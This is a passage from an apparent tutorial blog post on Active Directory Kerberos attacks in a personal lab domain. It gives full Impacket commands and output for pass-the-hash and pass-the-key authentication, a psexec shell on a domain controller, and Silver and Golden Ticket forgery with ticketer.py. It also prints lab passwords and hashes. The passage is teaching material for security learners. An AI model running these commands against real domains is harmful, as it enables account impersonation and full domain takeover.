<p>In short, <code>getTGT.py</code> takes the requesting user and adds it to the <code>KRB_AS_REQ</code> message. It then takes the hash we specified, and since it knows that when a hash is provided through <code>-hashes</code>, it is an NT hash, it creates a timestamp, encrypts the timestamp using the provided hash, and specifies in the <code>etype</code> field that the NT hash format (<code>RC4</code>) was used. Then, you already know the process the KDC follows to decrypt the timestamp.</p><br/>
<p>To avoid having to request a TGT or ST every time we want to communicate with a service or KDC, Kerberos allows us to store the TGT in ticket cache files (<code>.ccache</code>), which can be reused as long as the TGT is valid.</p><br/>
<p>Many tools, such as those in the Impacket suite, allow you to specify the <code>-k</code> parameter, indicating that you want to use Kerberos authentication. The tool will then search for the ticket cache file, and you need to set its location in the <code>KRB5CCNAME</code> environment variable. Since the <code>getTGT.py</code> tool saved the ticket cache in the <code>administrator.ccache</code> file, we can now export the <code>KRB5CCNAME</code> variable to point to the location of this file.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
</pre></div>
<p>Now, we can execute <code>psexec.py</code> by simply specifying the <code>-k</code> parameter and the FQDN: <code>dc01.elswixcorp.local</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">psexec</span><span class="o">.</span><span class="n">py</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">k</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">shares</span> <span class="n">on</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">.....</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">writable</span> <span class="n">share</span> <span class="n">ADMIN</span><span class="n">$</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploading</span> <span class="n">file</span> <span class="n">uKbQPLPE</span><span class="o">.</span><span class="n">exe</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">SVCManager</span> <span class="n">on</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">.....</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">service</span> <span class="n">qIDD</span> <span class="n">on</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">.....</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">service</span> <span class="n">qIDD</span><span class="o">.....</span>
<span class="p">[</span><span class="n">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.20348.587</span><span class="p">]</span>
<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>

<span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">Windows</span><span class="evrm">\</span><span class="evrm">system32</span><span class="evrm">&gt;</span>
</pre></div>
<p>As observed, it successfully provided us with a shell on the domain controller.</p><br/>
<p>This demonstration used <strong>Kerberos authentication</strong>, and <strong><code>psexec.py</code></strong> performed several actions behind the scenes. First, after specifying the <strong>TGT</strong>, it requested a Service Ticket for the <strong>CIFS</strong> service, which is essentially the <strong>SMB</strong> service. Since the <strong>TGT</strong> was valid, the <strong>TGS</strong> issued a <strong>ST</strong>, which <code>psexec.py</code> used to authenticate against the <strong>SMB</strong> service. Afterward, the tool uploaded a malicious binary to the <code>ADMIN$</code> share and created a service to execute this binary, providing us with a shell on the remote system.</p><br/>
<h3 class="note">Note</h3><br/>
<p>Whenever you use Kerberos authentication, you must specify the <code>FQDN</code> because it ensures proper name resolution in complex networks, avoids conflicts between servers with similar names, and helps validate the correct service principal. Kerberos relies on the <code>FQDN</code> for generating accurate cryptographic keys and securing communication between clients and servers, protecting against attacks such as spoofing. Additionally, the <code>FQDN</code> ensures that the client connects to the correct server within the intended domain, especially in multi-domain or distributed environments.</p><br/>
<p>The structure of the <code>FQDN</code> is typically as follows:</p><br/>
<div class="highlight"><pre><span></span><span class="p">(</span><span class="n">dc</span> <span class="n">hostname</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
</pre></div>
<p>For example, if the DC hostname is <code>dc01</code> and the domain is <code>domain.local</code>, the <code>FQDN</code> would be: <code>dc01.domain.local</code>.</p><br/>
<p>In the previous example, we used an NT hash. However, we can also perform a Pass-the-Key attack by providing the <code>AES</code> key in the same manner as the NT hash. For example, let's try using the following <code>aes256</code> key:</p><br/>
<div class="highlight"><pre><span></span><span class="mi">9734</span><span class="n">aeda304db0b0540ddd9c399e9fff88f9dd042e7a017733c0d4f66a63e8d3</span>
</pre></div>
<p>Now, let's repeat the process we followed with <code>getTGT.py</code>, but this time specifying the <code>-aesKey</code> parameter:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">getTGT</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">administrator</span> <span class="o">-</span><span class="n">aesKey</span> <span class="mi">9734</span><span class="n">aeda304db0b0540ddd9c399e9fff88f9dd042e7a017733c0d4f66a63e8d3</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">ticket</span> <span class="ow">in</span> <span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
</pre></div>
<p>Great! We successfully obtained a TGT and saved it to a ticket cache file. After that, the process is the same as in the previous demonstration.</p><br/>
<br/><h2>Silver Ticket</h2><br/>
<p>In the previous article, we introduced the Silver and Golden Ticket attacks. Now, let's delve into these concepts, starting with how the Silver Ticket works.</p><br/>
<p>A Silver Ticket attack allows an attacker to forge a <strong>Service Ticket (ST)</strong> to access specific services within an Active Directory environment without interacting with the Key Distribution Center (KDC). This is particularly dangerous because it bypasses certain authentication checks and focuses on compromising individual service accounts rather than the entire domain.</p><br/>
<p>To execute a Silver Ticket attack, the attacker needs to obtain the <strong>service account’s NT hash or AES key</strong>, which is derived from the credentials of the service account owner. With this hash, the attacker can create a fake <strong>Service Ticket (ST)</strong>, granting unauthorized access to the targeted service. Notably, this attack avoids direct communication with the KDC, reducing the likelihood of detection.</p><br/>
<p>As we explained in the previous article, when a client needs access to a service, it typically sends a <code>KRB_TGS_REQ</code> message to the KDC to request a Service Ticket. This ticket, which allows the client to authenticate with the service, is encrypted using the <strong>Service Master Key</strong>—essentially, the service owner’s NT hash or AES key. This encryption ensures that the ticket cannot be altered by unauthorized users.</p><br/>
<p>However, this mechanism has a significant vulnerability: if the service account's password is weak, an attacker may crack the ticket's encryption to uncover the NT hash or AES key. Once they have these credentials, the attacker can forge a malicious Service Ticket containing a <strong>manipulated Privilege Attribute Certificate (PAC)</strong> to escalate their privileges within the targeted service.</p><br/>
<p>However, a limitation of this attack lies in the <strong>PAC</strong>, a component of Kerberos tickets that contains user authorization data. Without the krbtgt key, the attacker cannot sign the PAC correctly. If the targeted service verifies the PAC against the KDC, the attack will fail. Fortunately for us, this is not common.</p><br/>
<h3>Abuse</h3><br/>
<p>For this demonstration, I configured an SQL Server running under the <code>ellie</code> user account. This means that <code>ellie</code> is the owner of this service, and her master key will be used to sign the Service Tickets (STs) for this service. Since we previously obtained her password, we can forge Service Tickets to impersonate high-privilege users, such as <code>administrator</code>, who has elevated access to the SQL service.</p><br/>
<p>Requirements for This Attack:</p><br/>
<ol>
<li><strong>Service Master Key</strong>: The NT hash or AES key of the service owner.</li>
<li><strong>Service Principal Name (SPN)</strong>: The identifier of the service.</li>
<li><strong>Domain SID</strong>: The Security Identifier for the domain.</li>
<li><strong>Target User</strong>: The account we want to impersonate for this service.</li>
</ol><br/>
<p>To demonstrate, I added an SPN to the <code>ellie</code> account that identifies the SQL service:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">GetUserSPNs</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">peter</span><span class="p">:</span><span class="s1">'cr4ckthis4n!c%'</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.13.0</span><span class="o">.</span><span class="n">dev0</span><span class="o">+</span><span class="mf">20241024.85237</span><span class="o">.</span><span class="n">db71504</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="n">ServicePrincipalName</span>                 <span class="n">Name</span>   <span class="n">MemberOf</span>  <span class="n">PasswordLastSet</span>             <span class="n">LastLogon</span>                   <span class="n">Delegation</span> 
<span class="o">-----------------------------------</span>  <span class="o">-----</span>  <span class="o">--------</span>  <span class="o">--------------------------</span>  <span class="o">--------------------------</span>  <span class="o">----------</span>
<span class="n">MSSQLSvc</span><span class="o">/</span><span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">:</span><span class="mi">1433</span>  <span class="n">ellie</span>            <span class="mi">2024</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">20</span> <span class="mi">00</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">52.772910</span>  <span class="mi">2024</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">21</span> <span class="mi">16</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">27.886209</span>             
<span class="n">http</span><span class="o">/</span><span class="n">ellie</span>                           <span class="n">ellie</span>            <span class="mi">2024</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">20</span> <span class="mi">00</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">52.772910</span>  <span class="mi">2024</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">21</span> <span class="mi">16</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">27.886209</span>
</pre></div>
<p>As observed, the <code>ellie</code> account now has the <code>MSSQLSvc/dc01.elswixcorp.local:1433</code> SPN assigned.</p><br/>
<h3 class="note">Note</h3><br/>
<p>I added <code>MSSQLSvc/dc01.elswixcorp.local:1433</code> as the SPN because it is <strong>"the provider-generated, default SPN when TCP is used,"</strong> as stated by <a href="https://learn.microsoft.com/en-us/sql/relational-databases/native-client/features/service-principal-name-spn-support-in-client-connections?view=sql-server-ver15">Microsoft's documentation</a>.</p><br/>
<p>Next, we need the <strong>Domain SID</strong>, a unique identifier assigned to a domain in a Windows Active Directory environment. The Domain SID is used to distinguish the domain and its associated objects (such as users, groups, and computers) across the network.</p><br/>
<p>To retrieve the Domain SID, we can utilize <code>lookupsid.py</code> from the Impacket suite:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">lookupsid</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">ellie</span><span class="p">:</span><span class="s1">'~smelly_ell1e~'</span><span class="o">@</span><span class="mf">192.168.100.1</span> <span class="o">-</span><span class="n">domain</span><span class="o">-</span><span class="n">sids</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">SID</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Brute</span> <span class="n">forcing</span> <span class="n">SIDs</span> <span class="n">at</span> <span class="mf">192.168.100.1</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Domain</span> <span class="n">SID</span> <span class="ow">is</span><span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1672168468</span><span class="o">-</span><span class="mi">2738507895</span><span class="o">-</span><span class="mi">2086515240</span>
</pre></div>
<p>The Domain SID is: <code>S-1-5-21-1672168468-2738507895-2086515240</code>.</p><br/>
<p>Next, we need the <strong>Service Master Key</strong>. Although we previously obtained Ellie’s password (<code>~smelly_ell1e~</code>), the plain-text password is not directly useful for forging Service Tickets. As we’ve discussed, STs are signed using cryptographic representations like the NT hash or AES keys.</p><br/>
<p>To generate the NT hash from the password, I used <a href="https://gchq.github.io/CyberChef/#recipe=NT_Hash()&amp;input=fnNtZWxseV9lbGwxZX4">CyberChef</a>. The resulting NT hash is:</p><br/>
<div class="highlight"><pre><span></span><span class="mi">96</span><span class="n">A44FFBF8BB1958B54D4D04C9C14F95</span>
</pre></div>
<p>Now, we can use <code>ticketer.py</code> to create a malicious Service Ticket. For this demonstration, I will impersonate the <code>administrator</code> user by specifying it as the target:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ticketer</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">spn</span> <span class="s1">'MSSQLSvc/dc01.elswixcorp.local'</span> <span class="o">-</span><span class="n">nthash</span> <span class="mi">96</span><span class="n">A44FFBF8BB1958B54D4D04C9C14F95</span> <span class="o">-</span><span class="n">domain</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">domain</span><span class="o">-</span><span class="n">sid</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1672168468</span><span class="o">-</span><span class="mi">2738507895</span><span class="o">-</span><span class="mi">2086515240</span> <span class="n">administrator</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.13.0</span><span class="o">.</span><span class="n">dev0</span><span class="o">+</span><span class="mf">20241024.85237</span><span class="o">.</span><span class="n">db71504</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">basic</span> <span class="n">skeleton</span> <span class="n">ticket</span> <span class="ow">and</span> <span class="n">PAC</span> <span class="n">Infos</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Customizing</span> <span class="n">ticket</span> <span class="k">for</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">administrator</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_LOGON_INFO</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_CLIENT_INFO_TYPE</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncTicketPart</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncTGSRepPart</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Signing</span><span class="o">/</span><span class="n">Encrypting</span> <span class="n">final</span> <span class="n">ticket</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_SERVER_CHECKSUM</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_PRIVSVR_CHECKSUM</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncTicketPart</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncTGSRepPart</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">ticket</span> <span class="ow">in</span> <span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
</pre></div>
<p>As observed, the tool successfully created a Service Ticket and saved it to the Ticket Cache file <code>administrator.ccache</code>. Next, as we did earlier, let's export the <code>KRB5CCNAME</code> variable:</p><br/>
<div class="highlight"><pre><span></span><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
</pre></div>
<h3 class="note">Note</h3><br/>
<p>The value of the <code>KRB5CCNAME</code> variable represents the location of the <code>ccache</code> file. If you export it using a relative path, as shown above, ensure you do not change directories afterward, as this would break the reference. Alternatively, you can specify an absolute path to avoid this issue.</p><br/>
<p>Finally, let's connect to the SQL Server using <code>mssqlclient.py</code>. We’ll provide the <code>-k</code> parameter to enforce Kerberos authentication, allowing the tool to retrieve the Service Ticket from the specified Ticket Cache file set in the <code>KRB5CCNAME</code> variable:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">mssqlclient</span><span class="o">.</span><span class="n">py</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">k</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.13.0</span><span class="o">.</span><span class="n">dev0</span><span class="o">+</span><span class="mf">20241024.85237</span><span class="o">.</span><span class="n">db71504</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Encryption</span> <span class="n">required</span><span class="p">,</span> <span class="n">switching</span> <span class="n">to</span> <span class="n">TLS</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">DATABASE</span><span class="p">):</span> <span class="n">Old</span> <span class="n">Value</span><span class="p">:</span> <span class="n">master</span><span class="p">,</span> <span class="n">New</span> <span class="n">Value</span><span class="p">:</span> <span class="n">master</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">LANGUAGE</span><span class="p">):</span> <span class="n">Old</span> <span class="n">Value</span><span class="p">:</span> <span class="p">,</span> <span class="n">New</span> <span class="n">Value</span><span class="p">:</span> <span class="n">us_english</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">PACKETSIZE</span><span class="p">):</span> <span class="n">Old</span> <span class="n">Value</span><span class="p">:</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">New</span> <span class="n">Value</span><span class="p">:</span> <span class="mi">16192</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">INFO</span><span class="p">(</span><span class="n">dc01</span><span class="p">):</span> <span class="n">Line</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Changed</span> <span class="n">database</span> <span class="n">context</span> <span class="n">to</span> <span class="s1">'master'</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">INFO</span><span class="p">(</span><span class="n">dc01</span><span class="p">):</span> <span class="n">Line</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Changed</span> <span class="n">language</span> <span class="n">setting</span> <span class="n">to</span> <span class="n">us_english</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ACK</span><span class="p">:</span> <span class="n">Result</span><span class="p">:</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">Microsoft</span> <span class="n">SQL</span> <span class="n">Server</span> <span class="p">(</span><span class="mi">160</span> <span class="mi">3232</span><span class="p">)</span> 
<span class="p">[</span><span class="n">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
<span class="n">SQL</span> <span class="p">(</span><span class="n">ELSWIXCORP</span>\<span class="n">Administrator</span>  <span class="n">dbo</span><span class="n">@master</span><span class="p">)</span><span class="o">&gt;</span>
</pre></div>
<p>As observed, we successfully gained access to the SQL service as <code>administrator</code> by forging a malicious Service Ticket. This was possible because we previously obtained the service owner's password and derived the cryptographic representation needed to sign the ticket.</p><br/>
<p>Before continuing with the <strong>Golden Ticket</strong>, I want to clarify a few things. As observed, we specified <code>administrator</code> at the end of the command, which seems to indicate the user we want to "impersonate." However, this parameter doesn't directly determine the impersonated user's privileges. Instead, it specifies the username that will appear in the <strong>Windows Security Logs</strong> as the owner of the Ticket. The actual privileges are controlled by the <strong>PAC</strong> (Privilege Attribute Certificate) embedded within the ticket, not the username provided in the command.</p><br/>
<p>If you check the help panel of <code>ticketer.py</code>, it explains the <code>-user-id</code> parameter:</p><br/>
<div class="highlight"><pre><span></span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="nb">id</span> <span class="n">USER_ID</span>      <span class="n">user</span> <span class="nb">id</span> <span class="k">for</span> <span class="n">the</span> <span class="n">user</span> <span class="n">the</span> <span class="n">ticket</span> <span class="n">will</span> <span class="n">be</span> <span class="n">created</span> <span class="k">for</span> <span class="p">(</span><span class="n">default</span> <span class="o">=</span> <span class="mi">500</span><span class="p">)</span>
</pre></div>
<p>By default, the value of the <code>-user-id</code> parameter is set to <code>500</code>, which is the RID of the <code>administrator</code> user. This RID is embedded in the PAC, and that’s why you can specify any user in the target field and still have administrator privileges. If you want to impersonate a different user, you need to specify the appropriate RID for that user. You can obtain this RID using the <code>lookupsid.py</code> tool.</p><br/>
<p>For example, for the user <code>elswix</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">lookupsid</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">ellie</span><span class="p">:</span><span class="s1">'~smelly_ell1e~'</span><span class="o">@</span><span class="mf">192.168.100.1</span> <span class="o">-</span><span class="n">domain</span><span class="o">-</span><span class="n">sids</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">elswix</span>
<span class="mi">1103</span><span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">elswix</span> <span class="p">(</span><span class="n">SidTypeUser</span><span class="p">)</span>
</pre></div>
<p>The RID for the user <code>elswix</code> is <code>1103</code>. Therefore, if you want to gain access to the SQL server with <code>elswix</code>'s privileges, you must specify <code>1103</code> in the <code>-user-id</code> parameter when creating the Service Ticket with <code>ticketer.py</code>.</p><br/>
<br/><h2>Golden Ticket</h2><br/>
<p>The Golden Ticket attack is similar to the Silver Ticket but involves higher access privileges and broader impact. The <strong>Silver Ticket</strong> exploits Service Tickets (STs), which grant access to specific services. This attack requires knowledge of the target service's master key, such as the NT hash of the service account.</p><br/>
<p>In contrast, the <strong>Golden Ticket</strong> attack abuses Ticket Granting Tickets (TGTs), which enable access to multiple services by requesting Service Tickets from the Kerberos Key Distribution Center (KDC). While the Silver Ticket is limited to a single service (because an ST is tied to a specific service), the Golden Ticket grants access to all services in the domain. This is because TGTs are used to generate STs for any requested service, effectively bypassing standard Kerberos authentication checks.</p><br/>
<p>Similar to the <strong>Silver Ticket</strong> attack, creating a Golden Ticket involves generating a TGT with a malicious Privilege Attribute Certificate (PAC). This allows us to impersonate any user and gain unrestricted access to any service within the domain. However, understanding how to construct a Golden Ticket requires a clear grasp of how TGTs function within the Kerberos authentication process.</p><br/>
<p>TGTs are issued by the Key Distribution Center (KDC) and play a central role in Kerberos. They serve as proof of authentication and are used to request Service Tickets (STs) for accessing specific services. Crucially, TGTs are encrypted using the KDC’s Master Key, which is derived from the NTLM hash of the <code>krbtgt</code> account. This means that to create a valid malicious TGT, you must have access to the <code>krbtgt</code> account credentials.</p><br/>
<p>Obtaining the <code>krbtgt</code> credentials is challenging due to several factors:</p><br/>
<ol>
<li><strong>Complexity</strong>: The NTLM hash of <code>krbtgt</code> is a strong cryptographic value that cannot be easily guessed or brute-forced.</li>
<li><strong>Periodic Rotation</strong>: By default, <code>krbtgt</code> credentials are rotated every 180 days, making previously compromised hashes invalid over time.</li>
</ol><br/>
<p>However, there are scenarios where an attacker might acquire the <code>krbtgt</code> credentials:</p><br/>
<ul>
<li><strong>Privileged Access</strong>: If an attacker has administrative privileges in the domain, they can perform a DCSync attack. This technique uses the replication protocol to extract the NTLM hash of <code>krbtgt</code> from the Domain Controller (DC).</li>
<li><strong>Backup Exploitation</strong>: Compromising a domain backup or a memory dump from a DC may expose the <code>krbtgt</code> credentials.</li>
</ul><br/>
<p>Once the <code>krbtgt</code> credentials are obtained, creating a Golden Ticket becomes straightforward. We can create a <code>TGT</code> for the corresponding domain, embed a custom PAC with high privileges, and encrypt it for future use. Additionally, since we have the <code>krbtgt</code> credentials, we can sign the PAC, ensuring that even if the PAC signature is checked (which is not common), it will pass verification because it was signed using the correct <code>krbtgt</code> credentials.</p><br/>
<h3>Abuse</h3><br/>
<p>This process can be automated using the <code>ticketer.py</code> script, just like we did for the <strong>Silver Ticket</strong>. However, this time we don’t need to specify an SPN or other type of service name—except for the <code>krbtgt</code> SPN, which the script handles automatically.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ticketer</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">nthash</span> <span class="n">a88e9a174ee94f60f932fec548a84ccb</span> <span class="o">-</span><span class="n">domain</span><span class="o">-</span><span class="n">sid</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1672168468</span><span class="o">-</span><span class="mi">2738507895</span><span class="o">-</span><span class="mi">2086515240</span> <span class="o">-</span><span class="n">domain</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="n">administrator</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.13.0</span><span class="o">.</span><span class="n">dev0</span><span class="o">+</span><span class="mf">20241024.85237</span><span class="o">.</span><span class="n">db71504</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">basic</span> <span class="n">skeleton</span> <span class="n">ticket</span> <span class="ow">and</span> <span class="n">PAC</span> <span class="n">Infos</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Customizing</span> <span class="n">ticket</span> <span class="k">for</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">administrator</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_LOGON_INFO</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_CLIENT_INFO_TYPE</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncTicketPart</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncAsRepPart</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Signing</span><span class="o">/</span><span class="n">Encrypting</span> <span class="n">final</span> <span class="n">ticket</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_SERVER_CHECKSUM</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_PRIVSVR_CHECKSUM</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncTicketPart</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncASRepPart</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">ticket</span> <span class="ow">in</span> <span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
</pre></div>
<p>Next, let's export the <code>KRB5CCNAME</code> variable:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
</pre></div>
<p>Finally, let's attempt to connect to a service using kerberos authentication. I'll use <code>wmiexec.py</code> to verify if the TGT is valid and we can obtain a shell as administrator:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">wmiexec</span><span class="o">.</span><span class="n">py</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">k</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.13.0</span><span class="o">.</span><span class="n">dev0</span><span class="o">+</span><span class="mf">20241024.85237</span><span class="o">.</span><span class="n">db71504</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

